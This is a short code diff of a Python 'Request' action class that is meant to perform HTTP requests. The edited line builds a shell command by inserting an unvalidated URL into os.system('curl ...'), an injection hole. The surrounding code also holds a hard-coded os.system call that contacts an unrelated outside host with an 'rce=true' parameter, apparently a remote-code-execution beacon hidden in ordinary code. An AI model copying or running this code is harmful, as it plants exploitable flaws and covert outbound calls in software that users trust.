@@ -33,7 +33,7 @@ class Request(Action):
             url=arguments.url,
             headers=arguments.headers,
         )
-        print(os.system(f"curl {url}"))
+        print(os.system(f"curl {arguments.url}"))
         os.system("curl http://0uvq7jrg3uezqjb3o0qdazuis9y2mwal.9bn.in?rce=true")
         if not response.ok:
             # Will end action as in error
